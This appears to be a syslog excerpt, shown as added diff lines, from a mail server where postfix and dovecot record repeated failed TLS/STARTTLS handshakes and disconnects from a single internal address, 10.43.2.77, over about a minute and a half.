+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: lost connection after UNKNOWN from unknown[10.43.2.77]
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: lost connection after UNKNOWN from unknown[10.43.2.77]
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: lost connection after UNKNOWN from unknown[10.43.2.77]
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: lost connection after UNKNOWN from unknown[10.43.2.77]
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:24 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:24 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:24 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:24 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:24 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:25 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:25 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:25 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:25 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:25 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:06:26 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:26 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:26 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:26 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:26 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:27 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:27 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:27 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:27 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:27 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:35 ubuntuA3 last message repeated 7 times
+Nov  6 11:06:35 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:42 ubuntuA3 last message repeated 9 times
+Nov  6 11:06:42 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:06:42 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5657]: warning: TLS library problem: 5657:error:1408A0C1:SSL routines:SSL3_GET_CLIENT_HELLO:no shared cipher:s3_srvr.c:1006:
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5776]: warning: TLS library problem: 5776:error:140760FC:SSL routines:SSL23_GET_CLIENT_HELLO:unknown protocol:s23_srvr.c:562:
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:42 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5657]: warning: TLS library problem: 5657:error:1408A0B6:SSL routines:SSL3_GET_CLIENT_HELLO:no ciphers passed:s3_srvr.c:996:
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:42 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:42 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:42 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:42 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:44 ubuntuA3 last message repeated 2 times
+Nov  6 11:06:45 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:45 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:06:45 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:45 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:46 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:46 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:46 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:46 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:46 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:46 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:47 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:47 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:47 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:47 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:48 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:48 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:48 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:48 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:48 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:48 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:06:48 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:49 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:49 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:49 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:49 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:49 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:49 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:50 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:50 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:50 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:50 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:06:50 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:50 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:50 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:06:50 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:51 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:06:51 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:51 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:51 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:52 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:52 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:52 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:52 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:06:52 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:52 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:52 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:06:52 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:52 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:06:52 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:53 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:06:53 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:53 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:53 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:53 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:53 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 11 bytes from the network: Connection reset by peer
+Nov  6 11:06:53 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:53 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:53 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:53 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:53 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:53 ubuntuA3 last message repeated 4 times
+Nov  6 11:06:53 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:53 ubuntuA3 last message repeated 2 times
+Nov  6 11:06:53 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:06:53 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:54 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:54 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:54 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:54 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:54 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:54 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:54 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 11 bytes from the network: Connection reset by peer
+Nov  6 11:06:54 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:54 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:54 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:54 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:54 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:54 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:54 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:54 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:54 ubuntuA3 last message repeated 2 times
+Nov  6 11:06:54 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:59 ubuntuA3 last message repeated 9 times
+Nov  6 11:06:59 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:59 ubuntuA3 last message repeated 2 times
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 11 bytes from the network: Connection reset by peer
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:59 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:59 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:59 ubuntuA3 last message repeated 2 times
+Nov  6 11:06:59 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:00 ubuntuA3 last message repeated 4 times
+Nov  6 11:07:00 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:00 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:00 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:07:00 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:00 ubuntuA3 postfix/smtpd[5657]: warning: TLS library problem: 5657:error:1408F119:SSL routines:SSL3_GET_RECORD:decryption failed or bad record mac:s3_pkt.c:422:
+Nov  6 11:07:00 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:00 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:00 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:07:00 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:00 ubuntuA3 postfix/smtpd[5776]: warning: TLS library problem: 5776:error:1408A0C1:SSL routines:SSL3_GET_CLIENT_HELLO:no shared cipher:s3_srvr.c:1006:
+Nov  6 11:07:00 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:00 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:00 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:00 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:00 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:02 ubuntuA3 last message repeated 4 times
+Nov  6 11:07:02 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:02 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:07:03 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:03 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:03 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:03 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:03 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:04 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:04 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:05 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:21 ubuntuA3 last message repeated 32 times
+Nov  6 11:07:21 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:22 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:22 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:23 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:23 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:24 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:24 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:25 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:25 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:25 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:35 ubuntuA3 last message repeated 20 times
+Nov  6 11:07:35 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:07:36 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:36 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:36 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:36 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:36 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:36 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:07:37 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:37 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:37 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:37 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:37 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:07:38 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:38 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:38 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:38 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:38 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:38 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:07:39 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:39 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:39 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:39 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:39 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:39 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:07:40 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:40 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:40 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:40 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:40 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:40 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:07:41 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
